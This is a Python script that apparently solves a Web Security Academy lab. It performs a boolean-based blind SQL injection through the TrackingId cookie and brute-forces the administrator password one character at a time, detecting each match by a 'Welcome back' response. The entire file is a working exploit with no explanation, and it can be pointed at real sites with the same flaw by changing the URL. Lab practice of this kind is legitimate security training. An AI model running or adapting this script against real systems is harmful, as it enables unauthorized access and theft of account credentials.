import urllib3
urllib3.disable_warnings()
import requests
import string

# ===== UPDATE THESE VALUES EACH TIME YOU OPEN A NEW LAB =====
url = "https://YOUR-LAB-ID.web-security-academy.net/"
tracking_id = "YOUR-TRACKING-ID"
session = "YOUR-SESSION-VALUE"
# ============================================================

charset = string.ascii_lowercase + string.digits
password = ""

print("[*] Starting Blind SQLi Brute Force...")
print("[*] Target: administrator password")
print("[*] Password length: 20 characters\n")

for position in range(1, 21):
    found = False
    for char in charset:
        payload = f"{tracking_id}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
        
        cookies = {
            "TrackingId": payload,
            "session": session
        }
        
        response = requests.get(
            url,
            cookies=cookies,
            proxies={
                "http": "http://127.0.0.1:8080",
                "https": "http://127.0.0.1:8080"
            },
            verify=False
        )
        
        if "Welcome back" in response.text:
            password += char
            print(f"[+] Position {position}: '{char}' found! Password so far: {password}")
            found = True
            break
    
    if not found:
        print(f"[-] Position {position}: No match found!")

print(f"\n[*] Attack complete!")
print(f"[*] Administrator password: {password}")
